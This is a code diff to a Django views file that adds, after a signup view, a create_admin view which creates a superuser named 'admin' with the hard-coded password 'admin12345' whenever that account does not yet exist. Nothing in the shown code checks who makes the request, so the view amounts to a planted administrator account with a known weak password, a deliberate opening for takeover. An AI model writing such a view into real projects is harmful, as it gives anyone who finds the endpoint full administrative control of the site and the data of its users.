@@ -207,3 +207,20 @@ def signup(request):
         'form': form,
         'grouped_preferences': grouped_preferences
     })
+
+from django.http import HttpResponse
+from django.contrib.auth import get_user_model
+
+
+def create_admin(request):
+    User = get_user_model()
+
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser(
+            username="admin",
+            email="admin@example.com",
+            password="admin12345"
+        )
+        return HttpResponse("Admin created")
+
+    return HttpResponse("Already exists")
